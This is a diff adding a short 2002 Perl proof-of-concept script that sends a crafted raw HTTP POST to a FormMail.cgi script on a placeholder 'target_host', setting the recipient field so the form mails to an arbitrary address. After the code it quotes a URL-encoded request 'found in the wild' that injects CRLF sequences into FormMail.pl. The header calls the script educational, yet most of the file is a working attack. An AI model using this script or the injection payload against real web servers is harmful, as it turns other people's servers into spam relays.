@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+
+# by -Sx- 09/24/2002 -- based upon code found at 
+# Rain Forrest Puppy's hide out...
+
+# PROVIDED AS-IS; WITH NO WARRANTY.
+
+# WARNING:  Please be aware that WC -Sx- Jones 
+# (aka insecurity.org) does NOT use FormMail.
+# The information provided here is strictly
+# educational and is intended as an example
+# of how such an attack could be constructed.
+
+use Socket;
+
+# can be DNS or IP address
+$ip="target_host";
+
+$parms="email=user\@else_where".
+"&recipient=user\@else_where".
+"&subject=How to hack FormMail";
+
+$tosend="POST /cgi/FormMail.cgi?$parms HTTP/1.0\r\n".
+"Referer: http://$ip/cgi/FormMail.cgi\r\n\r\n";
+
+print sendraw($tosend);
+
+sub sendraw {
+        my ($pstr)=@_; my $target;
+        $target= inet_aton($ip) || die("inet_aton problems");
+        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+                die("Socket problems\n");
+        if(connect(S,pack "SnA4x8",2,80,$target)){
+                select(S);              $|=1;
+                print $pstr;            my @in=<S>;
+                select(STDOUT);         close(S);
+                return @in;
+        } else { die("Can't connect...\n"); }}
+
+exit;
+__END__
+
+[ found in the wild ... ]
+
+A real example of this hack -
+
+email=2jl@8rzlpp5.com
+&recipient=formmailchecked@aol.com
+&subject=localhost%2Fcgi-bin%2FFormMail.pl
+&=%0D%0A%0D%0Atime%2Fdate%3A%203%3A55%3A46%20AM%20%2F%209%2F24%2F2002%0D%0A<A%20HREF%3D%22localhost%2Fcgi-bin%2FFormMail.pl%22>localhost%2Fcgi-bin%2FFormMail.pl<%2FA>%0A%0A%0A%0A71: 
